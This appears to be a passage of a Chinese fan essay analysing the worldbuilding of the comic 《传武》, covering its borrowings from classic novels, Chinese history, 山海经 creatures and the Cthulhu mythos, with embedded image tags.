src=\"https://pic3.zhimg.com/v2-e0bc4892678fce3601b5bcb502a8a298_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"863\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-e0bc4892678fce3601b5bcb502a8a298\" data-watermark-src=\"v2-2b5b4012b2e213634e345b0b1b34055a\" data-private-watermark-src=\"\"></p>\n<p>包括但不仅限于在泰安降临的惠安尊者木吒，潍坊的广目天王魔礼寿（原型出自封神）；滨州的灵感大王；淄州的布袋罗汉惧留孙（原型出自封神）；聊城的伏虎罗汉；东阿的慈航道人观世音；天牢中的百目道人；以及严华绝学枯木逢春的祖师地仙镇元子；上清道的祖师清源妙道真君；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cb431606c2bcc3e0126ff67b7dde4809_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"368\" data-watermark=\"watermark\" data-original-src=\"v2-cb431606c2bcc3e0126ff67b7dde4809\" data-watermark-src=\"v2-9a879e851d1466ff2894b137c6389cc0\" data-private-watermark-src=\"\"></p>\n<p>木吒的绝学是纸人法体以及化形出的三十六路天罡刀；这天罡刀就是在《西游记》原著中为帮助唐僧师徒收服红孩儿；木吒向父亲李天王借用的三十六把天罡刀；灵感大王在滨州与六合帮交手前和《西游记》中一样都布置了利于自己的环境；镇元子在《西游记》中也是依靠观音的帮助才使得人参果树起死回生；反而观音的延伸绝学千鬼横行按照星云老师的说法是发现自己的肉有驯服鬼怪的作用，原型更像是传说中的度母观音；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d1996bc79177e5a02262193bd413c567_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-d1996bc79177e5a02262193bd413c567\" data-watermark-src=\"v2-36f77cbc1c98f585f7695104261c2620\" data-private-watermark-src=\"\"></p>\n<p>可以说观音小分队承担了拉近传武世界与现实世界距离的作用；就好比有的人你很多年前就认识，但《传武》给你机会看了他不为人知的另一面；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2e869a3d33b70e55af278a299acb07e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"552\" data-watermark=\"watermark\" data-original-src=\"v2-2e869a3d33b70e55af278a299acb07e2\" data-watermark-src=\"v2-d734ad5eeb88d92733994767525e5b6a\" data-private-watermark-src=\"\"></p>\n<p><b>2.《封神演义》红尘仙的世俗依靠</b></p>\n<p>和《西游记》中的角色紧紧围绕降世观音不同，《封神演义》中出现的神则更多的对应上方的各位仙神；比如惧留孙就曾提到过元始天尊以及玉虚宫；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-19e551802975d77c33b3efccf0f7a089_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"329\" data-watermark=\"watermark\" data-original-src=\"v2-19e551802975d77c33b3efccf0f7a089\" data-watermark-src=\"v2-02c92911d40dbbf843b4bf67b088257e\" data-private-watermark-src=\"\"></p>\n<p>《封神演义》可以说承担了《传武》中大部分的神明体系；这一体系不仅体现在降世神明的口口相传中；哪怕地上的五行门，上清派，都多多少少的变成了这一体系下的衍生物；《传武》中有很多体制；上界的神魔体制；此方世界的六道体制；大汉的世家体制；大唐的山神土地制；大晋的城隍天牢体制；没有规矩不成方圆，神魔小说中必须有一个规矩去划定尺度以至于剧情不陷于无敌对无敌的崩坏泥沼；但是如果规矩太过复杂或者严苛又会形成知识壁垒，把对漫画不那么了解的普通人拦在墙外；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-77ecfa2952447f058dfe11e64605f2b5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"890\" data-rawheight=\"399\" data-watermark=\"watermark\" data-original-src=\"v2-77ecfa2952447f058dfe11e64605f2b5\" data-watermark-src=\"v2-7c6edd747cdf5066ed9bf9f6db93ced0\" data-private-watermark-src=\"\"></p>\n<p>《传武》比较聪明的调动了大众的公共认识，把我们童年已经构建的那套神魔世界体系在一定的合理化加工后变成一套即能简单上手又经得起推敲琢磨的世界观；可以说，没有《传武》中国孩子心中的这个世界依然存在，而《传武》 的出现，很好的把童年的回忆和我们期待的复杂诡计叙事结合了起来；就像《封神榜》中的漫天星斗，封神之前都要在凡尘中摸爬滚打；所以当看见天上的某颗星才会觉得既崇高又亲切；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b07c386b4555e5e2115d5b6688d94b7e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"990\" data-rawheight=\"556\" data-watermark=\"watermark\" data-original-src=\"v2-b07c386b4555e5e2115d5b6688d94b7e\" data-watermark-src=\"v2-0cc665ce24de5c62eb545e9076299153\" data-private-watermark-src=\"\"></p>\n<p><b>3.《水浒传》故事背后的故事</b></p>\n<p>只从个人角度来说，我觉得在《传武》之外，星云老师肯定曾今也构建过一个以《水浒传》为框架的小说或者漫画剧本；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-38418a796ee78ed2e855d78b7df7449e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"323\" data-watermark=\"watermark\" data-original-src=\"v2-38418a796ee78ed2e855d78b7df7449e\" data-watermark-src=\"v2-4e76b251c702a05f768bac3b2bdf827b\" data-private-watermark-src=\"\"></p>\n<p>一方面《传武》中出现那些天罡地煞的形象与名字，如原本就出自水浒的没遮拦穆弘，与水浒形象相似的一丈青姚金秀，以及蓝虎；还有天牢中的昆仑奴石方尊（运气爆表）双面人杨智,小阎王罗正等；其实都有极大的可能是出自星云大佬另外构建的一个世界中的出身角色；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4d722a4438af9cfd4d9207c23f90ea9b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"343\" data-watermark=\"watermark\" data-original-src=\"v2-4d722a4438af9cfd4d9207c23f90ea9b\" data-watermark-src=\"v2-3e491b22f8542f7cc46df943bd603783\" data-private-watermark-src=\"\"></p>\n<p>另外还有传武中无处不在的两个设定：有限的一百零八个天灾成道机会，以及朝廷到处收集的星斗仙术资料与天罡地煞术的存在；这里也很想安利一下同样非常优秀的田野一洋老师的《异闻水浒传》和胡伟老师的《长安督武司》；都是在限定了绝学和世界观上限的体系中厮杀的经典漫画；虽然《传武》中因为上方世界的存在，一定程度上削弱了这些下级武人之间拼杀的惨烈；但也能感受到很多可能转瞬即逝的龙套角色，在早期应该都是有属于自己的剧情脉络的；（好比番外篇的中出现的六合帮）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fc810d5d8e62a9ba9b28b7b7f50c6cc8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"980\" data-rawheight=\"503\" data-watermark=\"watermark\" data-original-src=\"v2-fc810d5d8e62a9ba9b28b7b7f50c6cc8\" data-watermark-src=\"v2-390d23b86c5620d341b12ec302623fe9\" data-private-watermark-src=\"\"></p>\n<p><b>4.漫画背后的微缩历史</b></p>\n<p>目前《传武》中明确设计的历史有楚汉战争（项羽和樊哙）大汉，颠覆大汉的张角；李世民打造的大唐（山神土地制度）上一世的人屠黄巢等；可以看出来如果二百年前的历史不因为上界的战争发生偏移那《传武》中此方世界的王朝与战争应该是和我们经历的历史高度趋同的；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1cc48689bae6652384149f2f4f14ed29_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"858\" data-rawheight=\"504\" data-watermark=\"watermark\" data-original-src=\"v2-1cc48689bae6652384149f2f4f14ed29\" data-watermark-src=\"v2-70dca6297ac252d3b0cd060e7d39c0d9\" data-private-watermark-src=\"\"></p>\n<p>同样的人物以及背景，虽然被赋予了各种绝学和传承，但是也和那些小说中的彩蛋一样，大大削减了读者的阅读门槛；在这一层上我们可以从一个弈棋者的视角而不是棋子的视角来盛世这些王朝之间的战争；比如祸秧道对王朝道的侵蚀，通过祸根来打造乱世；再比如生死道对其余五道的统治与经营布置；就好比上清道祖师李董说的，只有站在棋盘之上称为拿着棋子的人，才能看见《传武》世界的运行轨迹；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-11d4c67765658396cf7ca8535575ec11_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"813\" data-rawheight=\"494\" data-watermark=\"watermark\" data-original-src=\"v2-11d4c67765658396cf7ca8535575ec11\" data-watermark-src=\"v2-87204573ec997e204857a7755bbbdfad\" data-private-watermark-src=\"\"></p>\n<p>这种在完全架空的漫画中引用大量真实历史的文学产品虽然不在少数，比如《高堡奇人》，《祖国》；但像《传武》这样，如此大刀阔斧的在关键历史转折点改变历史轨迹，打造出一个在文化依然封建但是科技水平军事势力都远远高于当时社会的科技与神魔共存的世界的还是比较少见的（可能网络小说中会出现）这种生产认识与技术力的不平衡其本身就是极具戏剧性的；在传武早期还能看到完全出于农耕社会的东阿，聊城；但是到了朱雀的星轨开始这个世界就已经超出了社会自然发展的控制了；就像严华说的上界给这个世界带来了绝学，带来了星轨，带来了玉米；就像是二战后直接被划入全球化的原始社会，虽然大晋依然严格管控着这些变量，但是其中蕴含的变革的力量必将带动剧情的快速发酵；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f46703912b60b19508341b9cbe6b9e1d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"387\" data-watermark=\"watermark\" data-original-src=\"v2-f46703912b60b19508341b9cbe6b9e1d\" data-watermark-src=\"v2-a2b628a55fefb7a8c0edad5850a6588e\" data-private-watermark-src=\"\"></p>\n<h2><b>传武中的山海经设定</b></h2>\n<p>传武除了人类社会，其实还有一个比较隐晦的妖怪社会，比如一开始就说起的雁门关外的猰貐；陈兴获得的婴如；若木之种的各种形态；以及那些在千鬼横行中出现的各种天灾鬼患；其实在第一次连载阅读时期就能体验到这里的伏笔，然而在我阅读了星云老师的剧透后，还是觉得是我想的太简单了；山海种和人类之间既有合作共赢的历史（大唐的山神，大晋的山海司）也暗示了很多的种族问题以及人与自然的思辨；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-05791f1d24341abd4d64bb48c6b7799f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"885\" data-rawheight=\"381\" data-watermark=\"watermark\" data-original-src=\"v2-05791f1d24341abd4d64bb48c6b7799f\" data-watermark-src=\"v2-dd67e889e9929f436ad981eae3cc060c\" data-private-watermark-src=\"\"></p>\n<p><b>1.仁兽驺虞的变态之路</b></p>\n<p>就拿传说中的万物之红尘仙驺虞来说；《传武》中的驺虞最早出自第二卷第125条.经验之谈；是尸鬼一脉的祖先；然而在现实生活中：驺虞是中国古代传说中的一种野兽；一种虎躯猊首，白毛黑纹，尾巴很长的动物，在《神奇动物在哪里》中那个长尾巴的大猫就是驺虞。据说驺虞生性仁慈，连青草也不忍心践踏，不是自然死亡的生物不吃。被文人认为是仁慈之兽；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-64b15292759c46f004ca262bb027694f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"393\" data-watermark=\"watermark\" data-original-src=\"v2-64b15292759c46f004ca262bb027694f\" data-watermark-src=\"v2-5fe60163e54f520fced16752555ac8a3\" data-private-watermark-src=\"\"></p>\n<p>然而当驺虞第一次出现在《传武》世界观中时，他的设定则是尸鬼术的源头，世界僵尸的祖师，是怨恨人类的存在；其实我个人感觉当年此方世界的观音骑着的那只人面神兽应该就是驺虞，也只有山海种中的红尘仙才镇得住九尾狐这样的大妖；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-65ecb928bad538207efce2eefe353aa6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1037\" data-rawheight=\"401\" data-watermark=\"watermark\" data-original-src=\"v2-65ecb928bad538207efce2eefe353aa6\" data-watermark-src=\"v2-51449bfad0c18cd06327a6d3b3b335a3\" data-private-watermark-src=\"\"></p>\n<p>其实从后面水镜空间的剧情可以看出，此方世界的观音一直与山海种保持这高度的联系；但是也必然的她应该要为万物道红尘仙驺虞之后的变化附有一定的责任；根据星云老师在暗示中的线索此方世界的观音应该也是最早的绝技红尘仙（早于李董）；我们知道就大晋统治时期，王朝和鬼神的掌道者是站在大晋背后，万物和祸殃的掌道者与大晋对立，生死和奇技的掌道者则选择中立。 那么有没有可能在大汉建立之前除生死道外的五道也经历过某种对立与洗牌呢？（以上都是个人瞎猜，一切以剧情为准）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-58fba9888e986aa8eb2948df93682524_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"410\" data-watermark=\"watermark\" data-original-src=\"v2-58fba9888e986aa8eb2948df93682524\" data-watermark-src=\"v2-2a670cf2f0cfe1aecb9fd4301d2c57ad\" data-private-watermark-src=\"\"></p>\n<p><b>2.雁门关外的火凤燎原</b></p>\n<p>《传武》中雁门关外的那只猰貐一直是被不断提起确实又从未正面描述过的存在；我们读者除了知道猰貐很强（朱雀一种在送）且对人类抱有很大的恶意外，也并不知道更多的剧情了；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1cbdf63ccf70c408798cfc97005fa299_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"635\" data-watermark=\"watermark\" data-original-src=\"v2-1cbdf63ccf70c408798cfc97005fa299\" data-watermark-src=\"v2-d85adc45536d35d0853a43424bb4c707\" data-private-watermark-src=\"\"></p>\n<p>从星云老师剧透中提到的暗示来看四象各有分工，青龙负责把守天牢；白虎负责处理人形天灾；朱雀负责对敌雁门关的敌人；玄武负责游走于天下捉拿大晋潜在的威胁；其中朱雀掌握的南明离火属于《传武》八大火之一，是作者公认的规格外的存在（相当于隐形轰炸机）我简单在网上看来一下南明离火这个词；不出所料都是比较中二的设定聚合体；不结合现实中的中国历史来看，应该和《斗破苍穹》中的异火一样是特殊的火焰吧；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-90fdd0cfd1ed1c6951d85a5dd89bbb5f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"986\" data-rawheight=\"415\" data-watermark=\"watermark\" data-original-src=\"v2-90fdd0cfd1ed1c6951d85a5dd89bbb5f\" data-watermark-src=\"v2-0b11b47fa2aa5e70b1488606b208b7a9\" data-private-watermark-src=\"\"></p>\n<p>大晋要把超过四分之一的战力安排在雁门关外说明雁门关外的战争不仅仅是我们认识中的北方胡人侵扰的简单缩影，胡人方面其实也有万俟这样更明确的指代了；结合大晋用城隍制度取代了大唐的山神土地制度来看雁门关的战争可能另有隐情；个人猜测和当年山阴抽干鱼山龙脉有关；不知道现在开封天牢外的龙脉是否和鱼山龙脉有关；如果这龙脉是两个王朝之前非此即彼的关系的话，那最后作者的安排其实也能看出更多传承与发展间的取舍（不小心扯远了）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b38028b497124092a674e1b60d2e0211_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"307\" data-watermark=\"watermark\" data-original-src=\"v2-b38028b497124092a674e1b60d2e0211\" data-watermark-src=\"v2-11029d59eca9b550762d4efc59677b75\" data-private-watermark-src=\"\"></p>\n<p><b>3.青龙背负的四大灾星</b></p>\n<p>宁仲背上是所谓的人类面临的四大天灾；目前已经出现的是旱；洪；疫；虽然星云老师并没有设计好，但个人认为最后一个如果要找同等级的还是兵灾更合适一点（历史上兵灾有时也算天灾）；其余如蝗灾的代表飞蝗道人，泥石流的代表石方尊已经在天牢中；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a08166982c9e2ef3e88e8f6bf109f609_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"986\" data-rawheight=\"664\" data-watermark=\"watermark\" data-original-src=\"v2-a08166982c9e2ef3e88e8f6bf109f609\" data-watermark-src=\"v2-b89f7b8af62cb666d01e1be4c49a03a6\" data-private-watermark-src=\"\"></p>\n<p>关于人类对自然灾祸的恐惧，《诗·大雅·云汉》：“旱魃为虐，如惔如焚。”孟子提到：“洚水警余”。至于疫灾的危害，我们今天更是刻骨铭心；在星云老师还提到了如果《传武》的舞台在日本那天灾也免不了类似白胡子的震震果实和核辐射这样的类型；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-24b60a5d1cc23ac08e2e77d6a6bff3b9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"862\" data-rawheight=\"498\" data-watermark=\"watermark\" data-original-src=\"v2-24b60a5d1cc23ac08e2e77d6a6bff3b9\" data-watermark-src=\"v2-cd9819948a666ec58a6b8a64c718dcb9\" data-private-watermark-src=\"\"></p>\n<p>在《传武》世界观中天灾被限定为了一百零八种（部分龙套星云老师说不屑取名字），目前在天牢中与宁仲交手的有名有姓的天灾共有二十位：百目道人-百目；异食经-虢也；纸艺人-朱平；奈何手-道去 奈何手； 移山略缺-沈冲；三世神经-三首；活僵-亓官氏；五想欲-释寂悟 ；六度三绝-吾道济 ；蝗中躯-飞蝗道人；小阎王 -罗正；六臂尊者-迦叶；昆仑奴-石方尊；兽王-閺虎；缝尸匠-天残；红妆女-厉鬼；散发鬼；画郎书仙-不笑书生；纸人-朱褶；杨智-双面人；加上之前就提到的白骨洞的白骨精和李存孝；如果再加上山阴的百足等目前出现的天灾，目前应该有约二十五位天灾了；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-510b964bc9ee0968a38c56ca40964a18_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"927\" data-rawheight=\"627\" data-watermark=\"watermark\" data-original-src=\"v2-510b964bc9ee0968a38c56ca40964a18\" data-watermark-src=\"v2-a88b0448dbd623260fffa0d8073cc03d\" data-private-watermark-src=\"\"></p>\n<h2><b>传武中的克苏鲁设定</b></h2>\n<p>《传武》中的一大两点就是把传统神话中的旧神和克苏鲁神话中的外神巧妙结合；将原本的一个故事，通过世界观的调整，变成不同风格的多个版本；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cdfc5db79c792872c37c29a54d58f365_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"233\" data-watermark=\"watermark\" data-original-src=\"v2-cdfc5db79c792872c37c29a54d58f365\" data-watermark-src=\"v2-b66cb765b018264f5ed413653963319e\" data-private-watermark-src=\"\"></p>\n<p><b>1.黄衣之王与他的黄沙眷属</b></p>\n<p>黄衣之王哈斯塔，是克苏鲁神话中不可描述的旧日支配者，是克苏鲁的兄弟，也是克苏鲁的死敌；其实黄衣之王的设定是要早于克苏鲁神话的；罗伯特·W·钱伯斯在1895年出版的《黄衣之王》中就已经创造了这个角色，不过当创作克苏鲁神话的作者洛夫克拉夫特读到了黄衣之王这个设定时，他觉得这个角色简直就是为了克苏鲁世界创造的；于是黄衣之王也成立旧日支配者之一；在克苏鲁神话中，洛夫克拉夫特把他安排成了克苏鲁的死敌；不过在《传武》中他们属于同一阵营；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4f1bbcd53f24d42864725de85ac1f82b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"987\" data-rawheight=\"476\" data-watermark=\"watermark\" data-original-src=\"v2-4f1bbcd53f24d42864725de85ac1f82b\" data-watermark-src=\"v2-9c83fd468473c8c33d3db814d23e0cde\" data-private-watermark-src=\"\"></p>\n<p>理论上黄衣之王哈斯塔的本体被困在金牛座的毕宿五附近，所以他也被称为“深空星海之主”哈斯塔在成为黄衣之王有一个印记，是哈斯塔信徒信仰的来源之一；这个印记可能就是《传武》中道标的原型之一；我个人认为这个道标就是信仰的实体化产物；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-98973b9c29e75a243e7d5e63a84d2861_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"326\" data-watermark=\"watermark\" data-original-src=\"v2-98973b9c29e75a243e7d5e63a84d2861\" data-watermark-src=\"v2-33a9a57e96657500ebfc61204e0e1a9f\" data-private-watermark-src=\"\"></p>\n<p>在《传武》此方世界的黄泉渡口一战中，酆都就因为低估了哈斯塔和他的风之眷族导致难以消灭哈斯塔的有生力量导致此方世界的崩坏，星云老师提到过：外神选择攻陷本土神系的小千世界时，为了对付那些有着不死特质的本土神明；  外神入侵小千世界前需要先拆掉这个世界的底层框架，使世界规则先变为无序；很明显此方世界地狱的崩坏就是这个计划中的第一步；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-08e8df5d15c0f65f7b07d82dc13a4c2c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"801\" data-rawheight=\"454\" data-watermark=\"watermark\" data-original-src=\"v2-08e8df5d15c0f65f7b07d82dc13a4c2c\" data-watermark-src=\"v2-1784c0f66f9104be42d625a554fd9f20\" data-private-watermark-src=\"\"></p>\n<p><b>2.克苏鲁神话外的克苏鲁</b></p>\n<p>在淄州的惧留孙为了实验信仰之力，召唤了外域邪神克苏鲁；克苏鲁是美国小说家霍华德·菲利普·洛夫克拉夫特所创造的克苏鲁神话中的存在，和哈斯塔一样是旧日支配者之一。虽然不是克苏鲁神话中地位最高的，却是最知名的，同时也是克苏鲁神话的形象代表。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-238daf55e8928f4be973e9ddba119783_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"859\" data-rawheight=\"411\" data-watermark=\"watermark\" data-original-src=\"v2-238daf55e8928f4be973e9ddba119783\" data-watermark-src=\"v2-3d965a038ed80b080baf312b0300a7b6\" data-private-watermark-src=\"\"></p>\n<p>漫画中除了克苏鲁也同样出现了克苏鲁的眷族深海种；虽然智力不高但是和哈斯塔的风之眷族一样，在《传武》世界中起到提供信仰之力的作用，正是他们源源不断的信仰才使得如克苏鲁这样的神拥有源源不断的法力与生命力；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-575618ae9270b9ec55431bc06b51f277_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"860\" data-rawheight=\"369\" data-watermark=\"watermark\" data-original-src=\"v2-575618ae9270b9ec55431bc06b51f277\" data-watermark-src=\"v2-fa703d726c592d5a06583e2055b74039\" data-private-watermark-src=\"\"></p>\n<p>在淄州一战中惧留孙通过能力暂时击败了克苏鲁的投影；克苏鲁神话中个体生命的意义更多是只是神明传承的工具，在这场神魔大战中，神明方自己都没有意识到，自己可能也在渐渐转变为这种样子，如果真是这样，那将来即使旧神赢得了战争也可能可能转化为披着传统神明外衣的克苏鲁神；所以这也是为什么凡人不应该把命运交给那些高高在上的神明的原因；（个人观点）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7675a5361ac2400122bfbe423cb69f9a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"364\" data-watermark=\"watermark\" data-original-src=\"v2-7675a5361ac2400122bfbe423cb69f9a\" data-watermark-src=\"v2-932befdadf674c3520ae37de4eb8edf6\" data-private-watermark-src=\"\"></p>\n<h2><b>传武中的戏剧化设定</b></h2>\n<p><b>1.二百年一轮的庄周梦蝶</b></p>\n<p>两百年前对邪神的感知，开启了秦无阳的传奇一生；其实中国历史上也有一位秦舞阳，他随荆轲入秦刺杀秦始皇；但是历史的记载却很少；这两位秦舞阳都一样是自信且自负的理想主义者；首先从短暂的宏观来看秦舞阳没有错，他处处顾全大局，像极了战乱时期那些追求驱虎吞狼的革命者与战略家；但是神明所化的虎，你把握不住；天道更是一个混乱的不定值；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2f034f967a44561206a95c8274df89d2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"482\" data-watermark=\"watermark\" data-original-src=\"v2-2f034f967a44561206a95c8274df89d2\" data-watermark-src=\"v2-655da31f7b70ab91319b1ecb0f44ce3a\" data-private-watermark-src=\"\"></p>\n<p>无论如何漫画中秦舞阳在淄州的黄粱一梦都算是智斗的巅峰；通过梦境共享来做到使敌人自相矛盾；这种想象力和叙事性都是指的肯定的；星云老师说秦舞阳所用的梦境仙法不属于六道中的任何一门，因为梦是这个世界原有的东西；这让我想起黄衣之王哈斯卡在选择黄印宿主时往往会选择通过梦境来进入那人的思维深处，而秦舞阳自认为救苍生的举动也正想是他戏耍严华的黄粱一梦；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-71789f107c5ac9848edb6889d529936d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"987\" data-rawheight=\"550\" data-watermark=\"watermark\" data-original-src=\"v2-71789f107c5ac9848edb6889d529936d\" data-watermark-src=\"v2-240e7f3e5f8b0acfc32c9c29c28755bb\" data-private-watermark-src=\"\"></p>\n<p>这二百余年的舍命追求，到底是求来了神明的施舍；战争的胜利，还是到头来不过是黄粱一梦呢？期待秦舞阳这个山阴灵魂人物的结局，也期待未来有关他和二百年前的故事；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ba450150eb8856f8a4cd4523cc025223_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"983\" data-rawheight=\"482\" data-watermark=\"watermark\" data-original-src=\"v2-ba450150eb8856f8a4cd4523cc025223\" data-watermark-src=\"v2-c58308fae03d2ad9c6242909a768a5ef\" data-private-watermark-src=\"\"></p>\n<p><b>2.樊家的王之宝库</b></p>\n<p>目前在《传武》此方世界的体系中被星云老师认真为最强的就是生死道的酆都和他的幽都之种；目前已经出现的如恶来和项羽都展现出了碾压天灾级别的战力和操作（李存孝预计也有可能加入幽都大礼包）；而如此强大的生死道其实也不一定全身酆都的个人玩具；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9bea722a6762a46bc0b5285db4e42103_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"770\" data-rawheight=\"430\" data-watermark=\"watermark\" data-original-src=\"v2-9bea722a6762a46bc0b5285db4e42103\" data-watermark-src=\"v2-86a0030da5067124778bd695a5985509\" data-private-watermark-src=\"\"></p>\n<p>在汉代就有人想到了通过血脉存续来模仿幽都之种的方式，这就是樊之血；还有樊家掌握的绝学百兵演武；星云老师曾说过百兵演武和木吒的三十六天罡刀原理是一样的，区别是三十六天罡刀数量是固定的，而百兵演武中是有当代所有武器的投影；对一个武道强者来说，随时随地有取之不尽的武器是一种很可怕的绝学；武器本身因为长短软硬各有千秋，但是百兵演武可以使各种武器无缝配合，将武器之间CD的降到最小；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-322c97df2a3c79fc363b1b2724b21bc4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"295\" data-watermark=\"watermark\" data-original-src=\"v2-322c97df2a3c79fc363b1b2724b21bc4\" data-watermark-src=\"v2-c6e9664c213853a8b9510a8af027f187\" data-private-watermark-src=\"\"></p>\n<p>不过狗血的是，根据星云老师来说，世界上的百兵演武虽然人人可以上手学习，但所用的库是固定的，这就导致理论上，两个强者不可能同时使用百兵演武；不过反过来两个百兵演武的使用者在争抢百兵演武的使用权倒也是十分有意思的设定（不知道这个设定现在还在不在）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-577fc3d168534e0e75f64a8292ea6aea_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"817\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-577fc3d168534e0e75f64a8292ea6aea\" data-watermark-src=\"v2-15ccc498348215229dfdeae5d63a005c\" data-private-watermark-src=\"\"></p>\n<p><b>3.六道轮回间的相生相克</b></p>\n<p>在传武的世界有六道：这六道就是传武世界运行的底层逻辑：生死掌道者目前官方公认最强，酆都也是此方唯一没有继承人的红尘仙；奇技掌道者 最早应该是此方的观音，之后是汉代作用（千年宗门嘛）建立上清派的李董，现在的继任者好像是李春；祸殃掌道者目前应该是那个叫花子，传说一切天灾都是起源于他，是追求乱世的道，目前只知道宁仲身上的祸根是他的手笔；鬼神掌道者目前未知  曾协助构建了大唐的山神土地体系和大晋的城隍体系，按照传说应该建立有宗门；王朝掌道者目前未知，应该在大唐建立有宗门，据说他的衍生规则是玉玺，是祸殃道的死对头，喜欢构建统一和平的王朝；万物掌道者 最早应该是和观音一起活动的驺虞后来唐代时期是可以使用特殊水镜的犭婴如三公主，现任是雁门关外的猰貐；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-81cdc5ef98ee62eab1437b72fb0d6446_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"854\" data-rawheight=\"646\" data-watermark=\"watermark\" data-original-src=\"v2-81cdc5ef98ee62eab1437b72fb0d6446\" data-watermark-src=\"v2-3d179beb6800386321d8274708e64fab\" data-private-watermark-src=\"\"></p>\n<p>这六道互相干涉，互相制约，相生相克构建了此方的《传武》世界；《传武》的世界确实是非常缤纷绚烂的，可能开始有一点生涩，但是当你接受了这些基本设定就能够很好的享受这里面的乐趣；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1e65e30c08ed4b7ab95004611c70e227_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-1e65e30c08ed4b7ab95004611c70e227\" data-watermark-src=\"v2-169ae2151285dd842d8bfa5760bc0ca6\" 